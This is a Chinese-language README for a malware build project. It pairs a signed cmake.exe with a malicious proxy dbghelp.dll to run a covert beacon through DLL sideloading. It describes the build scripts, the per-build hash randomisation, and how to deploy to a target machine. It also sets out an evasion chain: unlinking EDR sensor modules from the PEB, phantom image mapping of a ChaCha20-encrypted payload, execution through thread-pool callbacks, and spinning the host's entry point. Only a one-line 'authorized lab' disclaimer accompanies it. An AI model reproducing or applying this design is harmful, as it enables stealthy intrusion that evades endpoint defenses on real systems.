# dbghelp_proxy —— cmake 白宿主侧加载源码工程（v5 链）

Visual Studio + MinGW 双工具链源码工程，构建"白 EXE（cmake.exe，Kitware 签名）
+ 黑 DLL（dbghelp.dll）"里的黑色代理 DLL。把两个文件放同一目录运行
`cmake.exe` 即上线：无窗口，信标常驻，宿主自身逻辑不会执行。

本项目是 [Neo-Maoku/DllMainHijacking](https://github.com/Neo-Maoku/DllMainHijacking)
（vendor 在 `../vendor`，如从 `DllMainHijacking_v2` 整体复制的话）的**第二代**重写。
代际差异见项目根 README（`cmake白加黑\` 的上一级工程目录）。

> 仅限所有者实验室环境内的授权安全研究使用。

## 目录结构

```
cmake_sideload/
├── CMakeSideload.sln            VS 解决方案（x64，Release）
├── build_msvc.cmd               MSVC/MSBuild 一键脚本   → dist\dbghelp.dll
├── build_mingw.cmd              MinGW-w64 一键脚本      → dist\dbghelp.dll
├── dbghelp_proxy/
│   └── dbghelp_proxy.vcxproj    /NODEFAULTLIB、入口=entry_dll、MASM 转发桩
├── src/
│   ├── main.c                   完整攻击链（全中文注释，每阶段一个注释块）
│   ├── peb_resolve.h            PEB 遍历 + djb2 哈希 API 解析
│   ├── payload_payload.h        自动生成：加密载荷 blob + .text 填充
│   ├── forwarding.asm           自动生成：MASM 跳转桩（MSVC 用）
│   ├── forwarding_stubs.h       自动生成：GCC 裸函数桩（MinGW 用）
│   ├── forwarding_count.h       自动生成：#define SD3_NEXPORTS
│   └── forwarding_names.h       自动生成：导出名表
├── exports/
│   └── dbghelp_proxy.def        自动生成：名字=fp_N 导出映射
├── res/
│   └── version.rc               与白宿主匹配的厂商版本资源
└── tools/
    ├── gen_exports.py           重新生成全部转发层文件
    └── gen_payload.py           从任意 .bin 重新生成 payload_payload.h
```

日常换载荷**不用手动跑生成器**——在项目根目录（上一级）直接：

```
python build.py 新载荷.bin
```

它会自动调用 gen_payload.py 重新加密、编译、校验 PE、更新根目录的
dbghelp.dll 并打印哈希。

## 构建

### 方式 A —— Visual Studio（MSVC）

要求：VS 2019/2022/18，装"使用 C++ 的桌面开发"工作负载（MASM 随附）。

```cmd
build_msvc.cmd          :: 或打开 CMakeSideload.sln 编译 Release|x64
```

输出：`dist\dbghelp.dll`。

### 方式 B —— MinGW-w64（生产工具链）

```cmd
build_mingw.cmd         :: 要求 x86_64-w64-mingw32-gcc 在 PATH 里
```

两种工具链都能出可用的 DLL。MinGW 版的暴破阶段更快（首次回连约 10 秒；
MSVC /O2 约 1~2 分钟），之后的信标行为完全一致。

### 重新生成载荷

```cmd
python tools\gen_payload.py path\to\payload.bin
build_msvc.cmd
```

载荷每次都用全新随机 ChaCha20 密钥加密，并追加 4~6KB 随机尾部填充，
因此每次构建 SHA256 唯一。`gen_exports.py` 只在换目标系统 DLL 时才需要
重新运行（默认读 `C:\Windows\System32\dbghelp.dll`）。

## 部署

1. 把 **`cmake.exe` + `dbghelp.dll`** 所在文件夹整体拷到目标机。
2. 运行 `cmake.exe`（双击或任意启动方式）。
3. 现象：无控制台窗口（FreeConsole）、无 GUI —— 一个隐藏进程常驻，
   信标跑在线程池回调里。

## 攻击链总览（DllMain 内依序执行）

| 阶段 | API 面 | 目的 |
|------|--------|------|
| hide_console | kernel32!FreeConsole | 关闭 CONSOLE 子系统宿主的黑框 |
| blind_unlink | 无（纯 PEB 写） | 把 atcuf64 / bdhkm64 传感器从模块链表摘除 |
| fwd_resolve  | kernel32!LoadLibraryA + GetProcAddress | 向宿主提供真 dbghelp 导出 |
| phantom 映射 | ntdll NtCreateSection(SEC_IMAGE) + NtMapViewOfSection | 自镜像映射，载荷覆写自己的 .text（MEM_IMAGE，零私有 RX） |
| 载荷解密 | 无（内联 ChaCha20 + CRC32） | UUID 解码 → 3 字节暴破还原密钥 → 流式解密 |
| 执行    | ntdll TpAllocWork + TpPostWork | 线程池回调，不建线程、不碰线程上下文 |
| 入口自旋 | ntdll NtProtectVirtualMemory | 宿主入口改写为 EB FE，秒退宿主永生 |

每阶段的详细注释见 `src/main.c`。

## 实现坑位（踩过的坑，务必遵守）

- 对运行中的自身映像调 NtOpenFile，访问掩码带 FILE_WRITE_DATA（0x23）
  会报 STATUS_SHARING_VIOLATION；必须 0x21。本项目干脆绕开 NtOpenFile，
  直接用 `kernel32!CreateFileA` + `GENERIC_READ | GENERIC_EXECUTE`。
- NtMapViewOfSection 可能返回 STATUS_IMAGE_NOT_AT_BASE（0x40000003）。
  只有**负值** NTSTATUS 才算失败。
- 密钥双半（g_key_masked / g_key_mask）必须留在**可写 .data**——
  声明成 const 会落到只读 .rdata，擦除密钥阶段直接访问异常。
- .text 填充数组必须大于加密后的载荷；大小由 payload_payload.h 里的
  TXTPAD_SIZE 控制（默认 147456，build.py 会按载荷大小自动增长）。
- EDR 传感器摘链必须用 x64 正确的 LDR_DATA_TABLE_ENTRY 偏移：
  三个链表节点在 `+0x00`、`+0x10`、`+0x20`；BaseDllName UNICODE_STRING
  在 `+0x58`。
